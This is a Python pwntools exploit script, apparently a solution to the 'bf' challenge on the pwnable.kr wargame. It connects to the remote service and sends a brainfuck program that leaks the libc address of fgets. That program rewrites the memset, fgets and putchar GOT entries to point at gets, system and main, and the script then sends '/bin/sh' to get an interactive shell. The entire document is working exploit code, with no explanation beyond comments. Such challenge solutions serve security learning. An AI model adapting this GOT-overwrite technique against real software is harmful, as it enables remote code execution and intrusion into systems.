import struct
import socket
import os
from pwn import *

IP = 'pwnable.kr'
PORT = 9001
CHUNK = 2048
libc = ELF ('./bf_libc.so')
MAIN_ADDR = 0x08048671
P_ADDR = 0x0804a0a0
main = 0x08048671
fgets_GOT = 0x0804a010
memset_GOT = 0x0804a02c
putchar_GOT = 0x0804a030
getchar_GOT = 0x0804a00c
__stack_chk_fail_GOT = 0x0804a014

system_bf_libc = 0x3ada0
#system_bf_libc = libc.symbols['system']
fgets_bf_libc = 0x5e150
#fgets_bf_libc = libc.symbols['fgets']
gets_bf_libc = 0x5f3e0
#gets_bf_libc = libc.symbols ['gets']
memset_bf_libc = 0x76fc0
putchar_bf_libc = 0x61920
getchar_bf_libc = 0x65b40
_IO_puts_bf_libc = 0x5fca0
__stack_chk_fail_bf_libc = 0xf7680

def main():

	s = remote (IP,PORT)
	# print welcome message
	data = s.recv (CHUNK)
	print (data)
	# print type message
	data = s.recv (CHUNK)
	print (data)

	toSend = ''
	# leak fgets address on libc

	# go to fgets GOT
	toSend += '<' * (P_ADDR - fgets_GOT)
	# print address
	toSend += '.>' * 4
	# restore
	toSend += '>' * (P_ADDR - fgets_GOT - 4)

	# overwrite the memset GOT entry to fgets address
	toSend += '<' * (P_ADDR - memset_GOT)
	# write 4 bytes
	toSend += ',>' * 4
	# restore
	toSend += '>' * (P_ADDR - memset_GOT - 4)

	# overwrite the fgets GOT entry to system address
	toSend += '<' * (P_ADDR - fgets_GOT)
	# write 4 bytes
	toSend += ',>' * 4
	# restore
	toSend += '>' * (P_ADDR - fgets_GOT - 4)

	# overwrite the putchar GOT entry to main address
	toSend += '<' * (P_ADDR - putchar_GOT)
	# write 4 bytes
	toSend += ',>' * 4
	# trigger putchar so main is called
	toSend += '.'

	s.sendline (toSend)

	# receive the leaked 4 bytes
	addr = s.recvn (4)
	addr = struct.unpack ('<I', addr)
	libc_address_int = int(addr[0])-fgets_bf_libc
	libc_address = hex(libc_address_int)
	print ('libc Address is:{}'.format(libc_address))

	fgets_address = libc_address_int + fgets_bf_libc
	# need to use gets, NOT fgets!
	gets_address = libc_address_int + gets_bf_libc
	system_address = libc_address_int + system_bf_libc
	
	s.send(struct.pack ('<I', gets_address))
	s.send(struct.pack ('<I', system_address))
	s.send(struct.pack ('<I', MAIN_ADDR))

	s.send ('/bin/sh\n')
	s.interactive()

	return


if __name__ == '__main__':
	main()